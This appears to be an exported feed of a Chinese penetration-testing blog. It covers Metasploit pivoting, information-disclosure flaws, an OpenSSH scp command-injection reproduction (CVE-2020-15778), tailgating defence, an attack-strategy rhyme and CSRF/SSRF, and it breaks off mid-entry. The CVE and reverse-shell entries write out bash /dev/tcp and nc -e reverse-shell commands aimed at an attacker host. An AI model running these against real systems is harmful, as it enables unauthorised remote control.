class="hljs-number">.0</span> <span class="hljs-number">255.255</span><span class="hljs-number">.255</span><span class="hljs-number">.0</span>  <span class="hljs-number">1</span>    <span class="hljs-comment">//1是 sessions序号</span><br>route print<br></code></pre></td></tr></table></figure><p>使用隧道 默认是使用socks5 也可以选择socks4a</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">use auxiliary<span class="hljs-regexp">/server/</span>socks_proxy<br>编辑一下proxy就可以使用了<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>内网</category>
      
      <category>个人笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>MSF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>敏感信息泄露漏洞</title>
    <link href="/2022/10/26/%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"/>
    <url>/2022/10/26/%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<p>不论是日常生活还是人际交往，信息的重要性都是毋庸置疑的，虽然信息是虚拟存在的，但是其所带来的价值是却是不可忽视的！</p><span id="more"></span><h3 id="简单介绍"><a href="#简单介绍" class="headerlink" title="简单介绍"></a>简单介绍</h3><p>信息泄露指网站无意向用户泄露敏感信息，可能包括以下内容:</p><ol><li>有关其他用户私密数据的,财务信息,个人身份信息等</li><li>敏感的商业数据</li><li>有关网站技术细节,架构,如源代码等</li></ol><p></p><p>这种泄露可能是不慎泄露给浏览该网站信息用户的，也有可能是攻击者通过恶意的交互从网站获得数据。</p><h3 id="敏感信息泄露示例"><a href="#敏感信息泄露示例" class="headerlink" title="敏感信息泄露示例"></a>敏感信息泄露示例</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> 通过robots.txt泄露网站隐藏目录、文件，或者站点结构<br><span class="hljs-bullet">2.</span> 网站站点的备份文件未删除导致的泄露，可能会泄露网站源代码<br><span class="hljs-bullet">3.</span> 没有正确处理网站的一些错误消息，在错误消息中泄露数据库表，字段等<br><span class="hljs-bullet">4.</span> 一些高度敏感的用户信息，银行账号等泄露<br><span class="hljs-bullet">5.</span> 在源代码中泄露数据库账号密码，等等(GitHub)<br><span class="hljs-bullet">6.</span> 网站某些程序的细微差别提示是否存在某些资源，用户名<br></code></pre></td></tr></table></figure><h3 id="敏感信息泄露产生原因"><a href="#敏感信息泄露产生原因" class="headerlink" title="敏感信息泄露产生原因"></a>敏感信息泄露产生原因</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> 未删除公开内容中的敏感信息(如开发人员的注释)<br><span class="hljs-bullet">2.</span> 网站不安全的配置(如：报错信息过于具体，网站开发时留下的调试网站功能)<br><span class="hljs-bullet">3.</span> 应用程序设计上的缺陷<br></code></pre></td></tr></table></figure><h3 id="敏感信息泄露挖掘的思路"><a href="#敏感信息泄露挖掘的思路" class="headerlink" title="敏感信息泄露挖掘的思路"></a>敏感信息泄露挖掘的思路</h3><h4 id="爬虫文件"><a href="#爬虫文件" class="headerlink" title="爬虫文件"></a>爬虫文件</h4><p>robots.txt和sitemap.xml等</p><p>这些文件会列出特定目录不让爬虫爬取因为它们可能包含敏感信息</p><p><img src="/../images/%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/image-20221026201603358.png" alt="1"></p><h4 id="目录信息泄露"><a href="#目录信息泄露" class="headerlink" title="目录信息泄露"></a>目录信息泄露</h4><p>有的网站因为不当的配置可能会暴露了网站目录以及一些开发者不希望用户访问的文件。</p><p>泄露敏感资源的存在与位置：</p><p><img src="/../images/%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/image-20221026201910517.png" alt="示例"></p><h4 id="注释或js文件"><a href="#注释或js文件" class="headerlink" title="注释或js文件"></a>注释或js文件</h4><p>开发过程中,开发者可能在HTML中写有关敏感信息的注释。部署到生成文件前，通常会删除，但是可能有时会因为有些人没有安全意识而忘记。也有可能是js代码会保留一些敏感信息</p><p><img src="/../images/%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/image-20221026202214762.png" alt="如果访问用户是管理员,将在页面上增加一个超链接 Admin panel 在. /admin-f6zfiz"></p><p>如果不看源代码,通过目录爆破很难发现。但是同时，该网站的访问控制也没有做好，我们可以轻松进入控制页面。</p><p><img src="/../images/%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/image-20221026202252214.png" alt="示例"></p><h4 id="错误消息"><a href="#错误消息" class="headerlink" title="错误消息"></a>错误消息</h4><ol><li>信息泄露的最常见原因之一是冗长的错误消息。</li><li>您应密切注意测试期间遇到的所有错误消息。</li><li>错误消息可能提醒测试人员应该输入什么消息或者什么数据类型的消息,这可以帮助我们识别可利用的参数来缩小攻击范围</li><li>详细的错误消息还可以提供有关网站使用的技术信息，如数据库类型,模板类型,服务器版本号等。</li><li>您可能还会发现该网站正在使用某种开源框架，在这种情况下，您可以下载研究源代码，可能有意外收获。</li><li>错误消息对SQL注入，用户名枚举等都很关键。</li></ol><h4 id="调试数据"><a href="#调试数据" class="headerlink" title="调试数据"></a>调试数据</h4><ol><li>出于调试目的，许多网站会生成自定义错误消息和日志,其中包含有关应用程序行为的大量信息</li><li>尽管此信息在开发过程中很有用，但如果在生产环境中泄漏，则对攻击者也非常有用。</li><li>调试消息有时可能包含用于发起攻击的重要信息，包括 :    <ol><li>可以通过用户输入操作的关键会话变量的值    </li><li>web中间件的主机名和登录凭据    </li><li>服务器上的文件和目录名称    </li><li>用于加密通过客户端传输的数据的密钥</li></ol></li><li>调试信息有时可能会记录在单独的文件中。</li></ol><h4 id="备份文件"><a href="#备份文件" class="headerlink" title="备份文件"></a>备份文件</h4><ol><li><p>获得源代码访问权限使攻击者更容易理解应用程序的行为并构造高严重性攻击。</p></li><li><p>敏感数据有时甚至被写在在源代码中，如数据库IP,密码(程序员提交到GitHub的开源项目)</p></li><li><p>有时候,网站自身可能由于某些原因,泄露其源代码：比如用Vim编程,在修改文件后 系统会自动生成一个带~的备份文件 , 某些情况下可以对其下载进行查看。</p></li><li><p>还有一些文件备份会在文件后面加上：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-title">.bak </span><br><span class="hljs-title">.rar.zip</span><br><span class="hljs-title">.7z</span><br><span class="hljs-title">.tar</span><br><span class="hljs-title">.gz</span><br><span class="hljs-title">.bak</span><br><span class="hljs-title">.swp</span><br><span class="hljs-title">.txt</span><br><span class="hljs-title">.html</span><br></code></pre></td></tr></table></figure></li></ol><h4 id="配置不安全导致信息泄露"><a href="#配置不安全导致信息泄露" class="headerlink" title="配置不安全导致信息泄露"></a>配置不安全导致信息泄露</h4><ol><li>由于配置不当，网站有时容易受到攻击。</li><li>又由于第三方技术的广泛使用，这种情况尤为普遍，第三方技术的很多配置选项并不一定被使用它们的人员所理解。</li><li>在其他情况下，开发人员可能会忘记在生产环境中禁用各种调试选项。</li><li>例如，HTTP TRACE方法被设计用于诊断目的 , TRACE允许顾客看到通过请求链的那一端在接收了些什么并使用那些数据来测试和诊断信息情况,开启可能导致某些危害</li></ol><h4 id="代码泄露-git版本控制"><a href="#代码泄露-git版本控制" class="headerlink" title="代码泄露-git版本控制"></a>代码泄露-git版本控制</h4><p>几乎所有网站都是使用某种形式的版本控制系统（例如Git）开发的。默认情况下，Git项目将其所有版本控制数据存储在名为.git的文件夹中。有时，网站在生产环境中公开此目录。在这种情况下，您可能只需浏览到即可访问它&#x2F;.git。而且还可以下载到本地,用本地安装的Git打开它 以访问网站的版本控制历史记录。这可能无法让您访问完整的源代码， 但是您可以阅读更改的代码片段，这仍然可能存在某些敏感数据。</p><p>利用工具 :  GitHack、gittools（推荐）、dvcs-ripper</p><h4 id="代码泄露-SVN版本控制"><a href="#代码泄露-SVN版本控制" class="headerlink" title="代码泄露-SVN版本控制"></a>代码泄露-SVN版本控制</h4><p>当开发人员使用 SVN 进行版本控制，对站点自动部署。如果配置不当,可能会将.svn文件夹直接部署到线上环境。这就引起了 SVN 泄露漏洞。</p><p>利用工具 : dvcs-ripper  Seay-Svn</p><h4 id="代码泄露-DS-Store-文件泄露"><a href="#代码泄露-DS-Store-文件泄露" class="headerlink" title="代码泄露-DS_Store 文件泄露"></a>代码泄露-DS_Store 文件泄露</h4><p>DS_Store 是用来存储这个文件夹的显示属性的：比如文件图标的摆放位置。这个文件可以删除，删除以后的副作用就是这些信息的失去。（当然，这点副作用其实不是太大）。</p><p>在和别人交换文件应该把 .DS_Store 文件删除比较妥当，因为里面包含了一些你不一定希望别人看见的信息（尤其是网站，通过 .DS_Store 可以知道这个目录里面所有文件的清单，很多时候这是一个不希望出现的问题）。</p><p>由于代码在部署上线的时候没有删除这个文件，导致不必要的信息泄漏。</p><p>利用工具 : ds_store_exp</p><h4 id="WEB-INF-x2F-web-xml泄露"><a href="#WEB-INF-x2F-web-xml泄露" class="headerlink" title="WEB-INF&#x2F;web.xml泄露"></a>WEB-INF&#x2F;web.xml泄露</h4><p>漏洞成因：</p><p>通常一些web应用我们会使用多个web服务器搭配使用，解决其中的一个web服务器的性能缺陷以及做均衡负载的优点和完成一些分层结构的安全策略等。在使用这种架构的时候，由于对静态资源的目录或文件的映射配置不当，可能会引发一些的安全问题，导致web.xml等文件能够被读取。</p><p>漏洞检测以及利用方法：</p><p>直接在域名后面加上WEB-INF&#x2F;web.xml就可以了。</p><p>WEB-INF主要包含一下文件或目录：    </p><ul><li>&#x2F;WEB-INF&#x2F;web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。   </li><li>&#x2F;WEB-INF&#x2F;classes&#x2F;：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中    </li><li>&#x2F;WEB-INF&#x2F;lib&#x2F;：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件   </li><li>&#x2F;WEB-INF&#x2F;src&#x2F;：源码目录，按照包名结构放置各个java文件。    </li><li>&#x2F;WEB-INF&#x2F;database.properties：数据库配置文件</li></ul><h4 id="CMS版本泄露"><a href="#CMS版本泄露" class="headerlink" title="CMS版本泄露"></a>CMS版本泄露</h4><p><img src="/../images/%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/image-20221026203304853.png" alt="CMS版本泄露"></p><h4 id="主机信息泄露"><a href="#主机信息泄露" class="headerlink" title="主机信息泄露"></a>主机信息泄露</h4><p><img src="/../images/%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/image-20221026203331112.png" alt="主机信息泄露"></p><h3 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h3><ol><li>删除以上存在的泄漏的目录</li><li>后台路径尽量复杂，不要被随便扫描出来</li><li>修改服务器配置禁止列目录</li><li>修改服务器配置禁止错误回显</li><li>删除没用的文件</li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>敏感信息</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>OpenSSH命令注入漏洞复现(CVE-2020-15778)</title>
    <link href="/2022/10/26/OpenSSH%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-CVE-2020-15778/"/>
    <url>/2022/10/26/OpenSSH%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-CVE-2020-15778/</url>
    
    <content type="html"><![CDATA[<p>OpenSSH命令注入漏洞复现(CVE-2020-15778)</p><span id="more"></span><h3 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h3><ol><li>漏洞描述</li><li>漏洞等级</li><li>漏洞影响版本</li><li>漏洞复现</li><li>修复建议</li></ol><h4 id="01-漏洞描述"><a href="#01-漏洞描述" class="headerlink" title="01_漏洞描述"></a>01_漏洞描述</h4><p>​OpenSSH是用于使用SSH协议进行远程登录的一个开源实现。通过对交互的流量进行加密防止窃听，连接劫持以及其他攻击。OpenSSH由OpenBSD项目的一些开发人员开发， 并以BSD样式的许可证提供，且已被集成到许多商业产品中。</p><p>​2020年6月9日，研究人员Chinmay Pandya在Openssh中发现了一个漏洞，于7月18日公开。OpenSSH的8.3p1中的scp允许在scp.c远程功能中注入命令，攻击者可利用该漏洞执行任意命令。目前绝大多数linux系统受影响。</p><p>利用条件:知道目标机的ssh密码。</p><p>漏洞利用场景:一般在特定环境下利用，比如在知道SSH账户密码后，但禁用SSH登陆或SSH连接被阻止，服务器允许使用scp传文件的情况下，可对其进行命令注入，所以如果攻击者不知道ssh账密，此漏洞无法利用。</p><h4 id="02-漏洞等级"><a href="#02-漏洞等级" class="headerlink" title="02_漏洞等级"></a>02_漏洞等级</h4><p><strong>高危</strong></p><h4 id="03-漏洞影响版本"><a href="#03-漏洞影响版本" class="headerlink" title="03_漏洞影响版本"></a>03_漏洞影响版本</h4><p>OpenSSH &lt;&#x3D; 8.3</p><h4 id="04-漏洞复现"><a href="#04-漏洞复现" class="headerlink" title="04_漏洞复现"></a>04_漏洞复现</h4><p>​scp 是 secure copy 的缩写。在linux系统中，scp用于linux之间复制文件和目录，基于 ssh 登陆进行安全的远程文件拷贝命令。该命令由openssh的scp.c及其他相关代码实现。</p><p>攻击机:Kali(192.168.233.161)</p><p>靶机:Centos7(192.168.233.160)</p><p>1.查看SSH版本,如显示的版本号属于受影响的版本则漏洞存在</p><p><img src="/../images/OpenSSH%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-CVE-2020-15778/image-20221026194201452.png" alt="1"></p><p>2.执行scp命令,执行反弹shell</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><span class="hljs-title">scp [上传任意文件] root@靶机IP地址:</span>&#x27;`bash -i &gt;&amp; /dev/tcp/攻击机IP地址/监听的端口 <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span>`&#x27;<br></code></pre></td></tr></table></figure><p><img src="/../images/OpenSSH%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-CVE-2020-15778/image-20221026195035079.png" alt="2"></p><p>3.打开xxxx端口并监听接受的信息</p><p><img src="/../images/OpenSSH%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-CVE-2020-15778/image-20221026195503671.png" alt="3"></p><p>4.在攻击机执行查看IP地址命令,显示出靶机的IP地址则表明反弹成功</p><p><img src="/../images/OpenSSH%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-CVE-2020-15778/image-20221026195156891.png" alt="4"></p><h4 id="05-修复建议"><a href="#05-修复建议" class="headerlink" title="05_修复建议"></a>05_修复建议</h4><p>5.1 SSH账密确保为强口令且周期性更换密码</p><p>5.2 使用rsync代替SCP</p><p>5.3 升级OpenSSH为最新版openssh-8.8p1.tar.gz  </p>]]></content>
    
    
    
    <tags>
      
      <tag>漏洞复现</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>什么是尾随攻击以及如何保护自己免受攻击</title>
    <link href="/2022/10/23/%E4%BB%80%E4%B9%88%E6%98%AF%E5%B0%BE%E9%9A%8F%E6%94%BB%E5%87%BB%E4%BB%A5%E5%8F%8A%E5%A6%82%E4%BD%95%E4%BF%9D%E6%8A%A4%E8%87%AA%E5%B7%B1%E5%85%8D%E5%8F%97%E6%94%BB%E5%87%BB/"/>
    <url>/2022/10/23/%E4%BB%80%E4%B9%88%E6%98%AF%E5%B0%BE%E9%9A%8F%E6%94%BB%E5%87%BB%E4%BB%A5%E5%8F%8A%E5%A6%82%E4%BD%95%E4%BF%9D%E6%8A%A4%E8%87%AA%E5%B7%B1%E5%85%8D%E5%8F%97%E6%94%BB%E5%87%BB/</url>
    
    <content type="html"><![CDATA[<p>无论您是花时间上网还是在办公室工作，您都希望知道自己处于安全的环境中，让您高枕无忧。虽然我们大多数人都知道在上网时要采取预防措施――保护自己免受网络钓鱼攻击和其他网络威胁的侵害，但我们也应该注意自己的人身安全。</p><span id="more"></span><p>一个问题是尾随――一种社会工程攻击，其中有人可以物理访问企业以获取机密信息或造成其他伤害。</p><h2 id="什么是尾随攻击"><a href="#什么是尾随攻击" class="headerlink" title="什么是尾随攻击?"></a>什么是尾随攻击?</h2><p>尾随是一种社会工程攻击，未经授权的人可以物理访问禁区（可能是密码保护区域)，在那里他们可能会窃取敏感信息、损坏财产、破坏用户凭据，甚至<strong>在计算机上安装恶意软件</strong>。</p><p>“捎带”与尾随密切相关，但它涉及受骗员工的同意。因此，虽然工作人员可能不知道有人将他们尾随其后进入禁区，但黑客可能会说服工作人员提供访问权限，因为他们冒充送货司机。</p><h2 id="谁有尾随攻击的危险"><a href="#谁有尾随攻击的危险" class="headerlink" title="谁有尾随攻击的危险?"></a>谁有尾随攻击的危险?</h2><p>尤其有可能称为尾随诈骗目标的公司包括:</p><ul><li>有许多员工，经常进出场所</li><li>具有多个进入建筑物的入口点</li><li>定期接收食物、包裹、文件和其他物品的交付</li><li>有许多分包商为他们工作</li><li>员工没有在物理和网络安全协议方面接受过全面培训</li></ul><p>一般来说，拥有强大安全系统(包括使用生物识别、徽章或其他身份和信息安全措施)的公司可以更好地防止尾随和捎带攻击。</p><p>但这并不是说某些口齿伶俐的欺诈者无法说服某人让他们进入或找到绕过这些保护措施的方法。</p><h2 id="常见的追尾方法有哪些"><a href="#常见的追尾方法有哪些" class="headerlink" title="常见的追尾方法有哪些?"></a>常见的追尾方法有哪些?</h2><p>您在工作中应该注意的常见尾随攻击类型包括:</p><ul><li>有人走到你身后进入安全区域，这取决于你的常见礼貌，为他们保持门打开</li><li>他们看起来不像快递员或送货司机</li><li>他们看起来不像快递员或送货司机</li><li>有人拿着满满一手的东西来欺骗你为他们开门</li><li>声称他们丢失了工作ID或将其忘在家里的人，以便您准许他们进入</li></ul><h2 id="如何保护自己免受未遂攻击"><a href="#如何保护自己免受未遂攻击" class="headerlink" title="如何保护自己免受未遂攻击"></a>如何保护自己免受未遂攻击</h2><p>保护自己免受尾随攻击的部分原因在于了解该问题，提高您对工作的认识水平，并取决于您的雇主，建立更有效的安全系统。</p><p>一些解决方案包括:</p><h3 id="加强安全培训"><a href="#加强安全培训" class="headerlink" title="加强安全培训"></a>加强安全培训</h3><p>许多公司知道如何培训员工识别、避免和应对在线安全问题，但可能忘记对物理安全进行同样的努力。如何发现和处理威胁应该是培训的一部分，同时培养对周围环境和可能不合适的人的意识。<br>管理层应向每个人提供明确说明的安全政策，该政策可能会坚持在没有适当通行证或身份证明的情况下不允许任何人进入安全区域。随着安全策略的更新，所有员工都应了解更改和添加内容。</p><h3 id="智能徽章和卡片"><a href="#智能徽章和卡片" class="headerlink" title="智能徽章和卡片"></a>智能徽章和卡片</h3><p>如果您的大型企业分布在多个楼层，员工可能很难知道谁在那里工作，谁不在那里工作，从而使他们容易受到尾随和捎带攻击。要求智能徽章和卡进入受限区域有助于减少未经授权的入侵并提供更好的访问控制。<br>建立配备专门安保人员的配备齐全的接待区也可以成为更大安保系统的一部分。</p><h3 id="生物识别扫描仪"><a href="#生物识别扫描仪" class="headerlink" title="生物识别扫描仪"></a>生物识别扫描仪</h3><p>生物识别扫描仪是一种更先进的方法，可以为工人的身份提供适当的身份验证。他们扫描一个人的独特身体或听觉特征，并将其与经批准人员的数据库进行比较。</p><p>生物特征安全的例子包括:</p><ul><li>语音识别</li><li>虹膜识别</li><li>指纹扫描</li><li>面部识别</li><li>心率传感器</li></ul><h3 id="了解社会工程学"><a href="#了解社会工程学" class="headerlink" title="了解社会工程学"></a>了解社会工程学</h3><p>人们容易受到物理和网络攻击的一个原因是他们缺乏社会工程及其构成的威胁类型的教育。</p><p>工人需要了解全方位的社会工程技术和专业知识来保护自己，无论是在他们的社交媒体账户还是在实际工作环境中。</p><p>就他们而言，公司可以使用模拟网络钓鱼电子邮件和尾随攻击来提高意识并强调如何遵循协议来处理它们。</p><h3 id="视频监控"><a href="#视频监控" class="headerlink" title="视频监控"></a>视频监控</h3><p>如果进入企业的方式有很多，那么在所有入口设置视频监控可能是有意义的。先进的视频监控系统可以使用人工智能(AI)和视频分析来扫描进入人员的面部，并将其与员工特征数据库进行比较。</p>]]></content>
    
    
    
    <tags>
      
      <tag>零零散散</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>企业网络的常见渗透思路</title>
    <link href="/2022/10/20/%E4%BC%81%E4%B8%9A%E7%BD%91%E7%BB%9C%E7%9A%84%E5%B8%B8%E8%A7%81%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF/"/>
    <url>/2022/10/20/%E4%BC%81%E4%B8%9A%E7%BD%91%E7%BB%9C%E7%9A%84%E5%B8%B8%E8%A7%81%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF/</url>
    
    <content type="html"><![CDATA[<p>看到的一段话,觉得很有意思,转载一下。</p><span id="more"></span><p>搞企业，先扫描；<br>扫描器，商业好； &#x2F;&#x2F; 商业版扫描器通常比较强大<br>默认密，都知道； &#x2F;&#x2F; 很多系统存在默认账号默认口令<br>社工库，找一找；<br>邮箱号，先列好； &#x2F;&#x2F; 搜集企业员工个人邮箱<br>九头蛇，跑一跑； &#x2F;&#x2F; Hydra 是一个密码破解工具<br>搞不定，放大招；<br>发邮件，凭伪造； &#x2F;&#x2F; 发钓鱼邮件，比如冒充管理员让用户到指定页面去输入密码<br>没邮箱，搞网站；<br>二级域，皆可爆； &#x2F;&#x2F; 主域的防护通常较好，某些较弱的二级域可作为突破点<br>老漏洞，没修好； &#x2F;&#x2F; 有些老漏洞可能没有被恰当地修复，工作失误也可能让漏洞回归<br>新漏洞，刷一票； &#x2F;&#x2F; 大部分企业对漏洞能做到一周内修复就算三好学生了<br>干研发，Git  找； &#x2F;&#x2F; 常有人把为公司写的代码也传到github上，里面可能会包含口令等<br>源代码，全都要； &#x2F;&#x2F; 即使源码不包含口令，也很有助于发现漏洞<br>CDN ，  可以跳；<br>防火墙，可以撬；<br>堡垒机，可以绕；<br>云防护，可以秒； &#x2F;&#x2F; 各种防护措施都不是有了就行，需要正确地使用<br>是企业，没有哪家搞不了！</p>]]></content>
    
    
    
    <tags>
      
      <tag>渗透思路</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>正向shell和反向shell</title>
    <link href="/2022/10/19/%E6%AD%A3%E5%90%91shell%E5%92%8C%E5%8F%8D%E5%90%91shell/"/>
    <url>/2022/10/19/%E6%AD%A3%E5%90%91shell%E5%92%8C%E5%8F%8D%E5%90%91shell/</url>
    
    <content type="html"><![CDATA[<p>假如ubuntu、CentOS为目标服务器系统</p><p>kali为攻击者的系统，ip为：192.168.0.4，开放7777端口且没被占用</p><p>最终是将ubuntu、CentOS的shell反弹到kali上</p><h3 id="正向反弹shell"><a href="#正向反弹shell" class="headerlink" title="正向反弹shell"></a>正向反弹shell</h3><h5 id="目标机-ubuntu或者CentOS-上面输入"><a href="#目标机-ubuntu或者CentOS-上面输入" class="headerlink" title="目标机(ubuntu或者CentOS)上面输入"></a>目标机(ubuntu或者CentOS)上面输入</h5><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">nc -lvp 端口号 -e <span class="hljs-regexp">/bin/</span>bash<br></code></pre></td></tr></table></figure><h5 id="攻击机上输入"><a href="#攻击机上输入" class="headerlink" title="攻击机上输入"></a>攻击机上输入</h5><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">nc</span> <span class="hljs-built_in">ip</span> 端口号<br></code></pre></td></tr></table></figure><p>正向反弹是目标机先执行nc命令，然后攻击机上再进行nc监听，即可反弹shell。</p><p>需要目标机安装nc。</p><h3 id="反向反弹shell"><a href="#反向反弹shell" class="headerlink" title="反向反弹shell"></a>反向反弹shell</h3><p>方法1：bash反弹</p><h5 id="被控制端-bash-i-gt-amp-x2F-dev-x2F-tcp-x2F-攻击机的ip-x2F-port-0-gt-amp-1"><a href="#被控制端-bash-i-gt-amp-x2F-dev-x2F-tcp-x2F-攻击机的ip-x2F-port-0-gt-amp-1" class="headerlink" title="被控制端:bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;攻击机的ip&#x2F;port 0&gt;&amp;1"></a>被控制端:bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;攻击机的ip&#x2F;port 0&gt;&amp;1</h5><p><img src="/../images/%E6%AD%A3%E5%90%91shell%E5%92%8C%E5%8F%8D%E5%90%91shell/image-20221019201817575.png" alt="a"></p><h5 id="但首先需要在攻击机上使用nc监听端口：nc-lvp-端口号"><a href="#但首先需要在攻击机上使用nc监听端口：nc-lvp-端口号" class="headerlink" title="但首先需要在攻击机上使用nc监听端口：nc -lvp 端口号"></a>但首先需要在攻击机上使用nc监听端口：nc -lvp 端口号</h5><p><img src="/../images/%E6%AD%A3%E5%90%91shell%E5%92%8C%E5%8F%8D%E5%90%91shell/image-20221019201951687.png" alt="b"></p><p>此时就可以获得shell</p><p><img src="/../images/%E6%AD%A3%E5%90%91shell%E5%92%8C%E5%8F%8D%E5%90%91shell/image-20221019202129236.png" alt="c"></p><p>此方法在ubuntu下不会反弹成功，CentOS可以反弹成功</p><h3 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h3><p>​无论是正向shell还是反弹shell，都是A控制B，只是请求端不一样，一个是主动控制，一个被动控制，与<a href="https://so.csdn.net/so/search?q=%E6%AD%A3%E5%90%91%E4%BB%A3%E7%90%86&spm=1001.2101.3001.7020">正向代理</a>和反向代理一样。<br>​反弹shell就会更加的稳定，用途更大。</p>]]></content>
    
    
    
    <tags>
      
      <tag>反弹shell</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>简述CSRF和SSRF的区别</title>
    <link href="/2022/10/16/%E7%AE%80%E8%BF%B0CSRF%E5%92%8CSSRF%E7%9A%84%E5%8C%BA%E5%88%AB/"/>
    <url>/2022/10/16/%E7%AE%80%E8%BF%B0CSRF%E5%92%8CSSRF%E7%9A%84%E5%8C%BA%E5%88%AB/</url>
    
    <content type="html"><![CDATA[<p>目前正在了解Web漏洞，正巧在各类面试题中都看到这样一道面试题：</p><p>“请简述CSRF、SSRF与会话重放的区别”</p><p>因为最近正好了解到CSRF和SSRF，会话重放还不太熟悉，所以将会话重放暂且不提，在以下总结CSRF和SSRF的概念与区别。</p><span id="more"></span><h2 id="CSRF："><a href="#CSRF：" class="headerlink" title="CSRF："></a>CSRF：</h2><p>CSRF，本名为Cross-site requestforgery，也就是跨站请求伪造。</p><h4 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h4><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs elixir">跨站请求伪造(英语<span class="hljs-symbol">:Cross-site</span> request forgery) ，也被称为one-click attack或者session riding，通常缩写为<span class="hljs-title class_">CSRF</span>或者<span class="hljs-title class_">XSRF</span><br>是一种挟持用户在当前已登录的web应用程序上执行非本意的操作的攻击方法。<br>例如<span class="hljs-symbol">:</span>攻击者盗用了你在某个网站的身份,以你的名义发送恶意请求。<br></code></pre></td></tr></table></figure><h4 id="与XSS不得不说的关系"><a href="#与XSS不得不说的关系" class="headerlink" title="与XSS不得不说的关系"></a>与XSS不得不说的关系</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs">说到CSRF，不得不提一下XSS。CSRF看起来好像和XSS跨站脚本攻击有着“不得不说的秘密”，实则却是两个不同维度的情况。从名字上来看，同为跨站攻击，XSS攻击是跨站脚本攻击，CSRF攻击是请求伪造，也就是CSRF攻击本不是出自用户之手，却经过第三方恶意攻击者的处理，伪装成了受信任用户的“亲历亲为”。<br>XSS是实现CSRF的诸多途径中的一条，但并不是唯一的一条。<br></code></pre></td></tr></table></figure><h4 id="CSRF能做的事"><a href="#CSRF能做的事" class="headerlink" title="CSRF能做的事"></a>CSRF能做的事</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 